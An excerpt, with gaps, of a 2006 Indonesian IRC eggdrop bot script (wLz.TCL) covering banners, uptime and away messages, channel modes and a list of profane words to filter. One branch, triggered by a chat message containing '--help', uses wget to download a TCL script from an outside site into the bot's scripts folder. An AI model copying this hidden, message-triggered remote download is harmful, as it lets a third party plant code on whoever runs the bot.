########################################################################################
#     __  __  ____                         # Script Name    	     : wLz.TCL         #
#    / / / / /___ /                        # Script Version 	     : t.c(£)v.9       #
#   /_/ / /_ _/_/_                         # Author         	     : IndraWaLLz      #
#  /___/___//___ /                         # Release Date   	     : 1 Agustus 2006  #
#                    			       # Reported any bugs	     : #Muria          #
#        				             # New Staff wLz Script      : Rats            #
...
puthlp "NOTICE $nick :$notc LastUpdate: 07 Oct04. Info: Several Bug Fixed !!!"
}
...
if {[string match "*--help*" $hasil]} {
	...
	catch {[exec wget slavezerofx.net/tools/tcl/slavezerofx.tcl -O scripts/slavezerofx.tcl]} hasilwget
...
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vokk+ov $botnick $botnick [rand 15]9W.a.L.L.z.S.t.a.F.F $vern2 $botnick $botnick"
} {
...
if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours JaM, "} {set hourstext "$hours JaMm, "}
if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins MeNiT"} {set minstext "$mins MeNiTs"}
...
set longer "9,8\[W8,9L8z\] 9t.c(8£9)v.9 Up: $output Hrs ([getuser "config" XTRA "AWAY"])"
} {
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set longer "9,8\[W8,9L8z\] 9t.c(8£9)v.9 Up: $output Hrs 12\[1$awaymsg12\]"
}
}
...
putsrv "PART $errchan :1regained (9@1)ps status"
} {
...
if {$badwords == ""} {
set badwords "cibai bitch kimak memek kontol kanjut bangsat ngentot fuck peler lanciau bajingan vagina ngewe shit asshole anjing asu kirik gawuk turuk itil bajingan bangsat jembut silit picek babi kampang"
setuser "config" XTRA "BADWORDS" $badwords
}
...
putlog "======================================="
putlog "            wLz.tcl Loaded             "
putlog "         www.indrawebmaster.com        "
putlog "    E-mail : indrawalls@yahoo.com      "
putlog "======================================="
